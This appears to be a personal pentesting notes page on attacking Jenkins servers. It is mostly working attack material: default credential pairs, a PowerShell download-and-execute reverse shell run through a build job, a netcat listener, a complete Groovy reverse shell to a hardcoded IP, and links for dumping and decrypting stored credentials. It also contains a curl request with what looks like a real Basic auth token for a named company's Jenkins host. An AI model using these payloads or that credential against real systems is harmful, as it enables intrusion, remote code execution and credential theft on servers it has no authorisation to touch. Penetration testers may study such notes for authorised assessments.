---
layout: notes
permalink: /notes/tech/devops/
title: Pentesting DevOps Tools
---

# Pentesting DevOps Tools
## Pentesting Jenkins
```bash
https://github.com/Rajchowdhury420/Jenkins-PenTest
https://pentestbook.six2dez.com/enumeration/webservices/jenkins
https://hacktricks.boitatech.com.br/

#Low Hanging Fruits
# 1. Create Account if link exist 
# 2. Default or weak credentials
admin:admin
jenkins:jenkins
admin:jenkins
test:test

#Access to Build Environment
# 1.Create New Item (e.g. choose Freestyle project)
# 1.1 In Build option, choose execute command (for Windows is Execute Windows batch command)
# 1.2 Put the payload for reverse shell: 
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
# 1.3 Download the Invoke-PowerShellTcp.ps1 script to your machine
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
# 1.4 Run the python server: 
python3 -m http.server
# 1.5 Start the netcat listener:
nc -lvnp 4444
# Run the Build command on Jenkins

#Log4J
# 1. Navigate to /script 
https://your-jenkins.domain/script
# 2. Paste 
org.apache.logging.log4j.core.lookup.JndiLookup.class.protectionDomain.codeSource
# 3. If the output is 
groovy.lang.MissingPropertyException: No such property: org for class: Script1 #You're good then, otherwise you're not good.

#Dump Jenkins Credentials through /script console
https://www.codurance.com/publications/2019/05/30/accessing-and-dumping-jenkins-credentials
https://medium.com/@eng.mohamed.m.saeed/show-all-credentials-value-in-jenkins-using-script-console-83784e95b857

#XSS
https://packetstormsecurity.com/files/160443/Jenkins-2.235.3-Cross-Site-Scripting.html
https://packetstormsecurity.com/files/155200/Jenkins-Build-Metrics-1.3-Cross-Site-Scripting.html

#Jenkins API curl connect
curl -i -s -k -X $'GET' \
-H $'Authorization: Basic ZWxlbmFfc3RlcHVyb0BlcGFtLmNvbToxMWZkMmU4NGUzYzc1NmFmNzFlM2UyMmFiZTg0OWMxNGIy' -H $'Host: jenkins.epam.com' \$'https://jenkins.epam.com/jenkins/'

#Hacking AWS with jenkins
https://www.pgs-soft.com/blog/hacking-into-an-aws-account-part-2-jenkins/

#RCE with Job
https://www.whiteoaksecurity.com/blog/jenkins-remote-execution-via-malicious-jobs/

#Decrypt credentials.xml
https://securityboulevard.com/2019/02/jenkins-decrypting-credentials-xml/

#Decrypt python script
https://github.com/bstapes/jenkins-decrypt

#Decrypt GO script
https://github.com/hoto/jenkins-credentials-decryptor

#Groovy Script Reverse Shell:
String host = "10.8.10.235";
int port = 4445;
String cmd = "/bin/bash";
Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s = new Socket(host, port);
InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
OutputStream po = p.getOutputStream(), so = s.getOutputStream();
while (!s.isClosed()) {
    while (pi.available() > 0) so.write(pi.read());
    while (pe.available() > 0) so.write(pe.read());
    while (si.available() > 0) po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);
}
p.destroy();
s.close();
```